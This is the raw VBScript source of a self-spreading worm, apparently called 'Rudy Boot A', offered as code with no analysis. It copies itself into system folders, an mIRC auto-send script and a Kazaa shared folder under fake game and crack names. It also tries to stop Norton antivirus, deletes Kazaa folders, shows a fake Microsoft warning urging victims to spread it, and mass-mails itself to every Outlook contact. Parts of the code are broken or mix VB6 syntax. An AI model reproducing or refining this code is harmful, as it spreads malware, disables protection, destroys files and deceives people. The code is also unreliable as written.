on error resume next
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile "C:\System.vbs", "C:\WINDOWS\DataRestore.vbs", True

Dim shell, msc, batch, fso, batchb
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\System.vbs", True
set batch=CreateTextFile("C:\DVD.bat")
batch.WriteLine "cls"
batch.WriteLine "@echo off"
batch.WriteLine "cscript C:\Restore.vbs"
batch.Close
set shell=wscript.createobject("wscript.shell")
set msc=shell.CreateShortCut("C:\pif.lnk")
msc.TargetPath=shell.ExpandEnvironment("C:\bat.bat")
msc.WindowStyle=4
msc.Save

Dim mirc
set fso=CreateObject("Scripting.FileSystemObject")
set mirc=fso.CreateTextFile("C:\program files\mirc\script.ini")
fso.CopyFile Wscript.ScriptFullName, "C:\program files\mirc\scripts.vbs", True
mirc.WriteLine "[script]"
mirc.WriteLine "n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\program files\mirc\attachment.vbs }
mirc.WriteLine "n1=ctcp 1:*:?:$1-"
mirc.Close

Private Sub Form_Load()
StopService "Norton Antivirus Auto Protect Service"
End Sub

Sub StopService(ServiceName As String)
a = """" & ServiceName & """"
Shell "net stop " & a, vbHide
End Sub

On Error Resume Next
Dim FsCopyer2
Set FsCopyer2 = CreateObject("Scripting.FileSystemObject")
FsCopyer2.CopyFile Wscript.ScriptFullName, 

"C:\Progra~1\Kazaa\MySharedFolder\Grandtheftauto3.exe.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\Warcraft3.exe.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\Gamers 

mania.exe.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\Swishmax.exe.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\AIM hack 

V3.exe.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\Flash 5.exe.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\Sexgames.zip.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\Brute forcer.exe.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\Flash MX.zip.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\Swishlite.exe.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\serials.zip.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\TrueCrime 

LA.exe.vbs",True
Set FsCopyer = Nothing 

dim foldersys
set foldersys=CreateObject("Scripting.FileSystemObject")
If foldersys.FolderExists ("C:\Program Files\KaZaA\") Then
foldersys.DeleteFolder "C:\Program Files\KaZaA\",True
End if

dim foldersys
set foldersys=CreateObject("Scripting.FileSystemObject")
If foldersys.FolderExists ("C:\My Shared Folder") Then
foldersys.DeleteFolder "C:\My Shared Folder",True
End if

dim foldersys
set foldersys=CreateObject("Scripting.FileSystemObject")
If foldersys.FolderExists ("C:\Program Files\KaZaA Lite\") Then
foldersys.DeleteFolder "C:\Program Files\KaZaA Lite\",True
End if

msgbox "Theres been a new Worm spotted out in the wild called Rudy Boot A. We are looking for more versons 

of it.It is a very smart worm and can be dangerous. We have scanned your computer and have not found Rudy 

boot A in your system, but beware of what you download, and open. Its a fast spreading Worm so tell all your 

friends and family about this message and the Worm.We have sent email to all your friends and that has a 

DataRestore program in to protect from this virus tell all your friends to download the attachment.If they scan the 

attachment it will say theres a virus in it buts theres not since it is a virus scanner and remover.Thank you from 

your team at Mircosoft.

Do 
msgbox "Rudy Boot A is done for now"

'this is the important crap
if day(now())=15 AND month(now())=3 then
a=true
else
a=false
loop until a=true

Dim x 
on error resume next 
Set fso ="Scripting.FileSystem.Object" 
Set so=CreateObject(fso) 
Set ol=CreateObject("Outlook.Application") 
Set out= WScript.CreateObject("Outlook.Application") 
Set mapi = out.GetNameSpace("MAPI") 
Set a = mapi.AddressLists(1) 
For x=1 To a.AddressEntries.Count 
Set Mail=ol.CreateItem(0) 
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
Mail.Subject="Check it out" 
Mail.Body="Man I just found this awesome program it keeps track of all lost data and restores it download it in 

the attachment." 
Mail.Attachments.Add "C:\WINDOWS\DataRestore.vbs"

Mail.Send 
Next 
ol.Quit 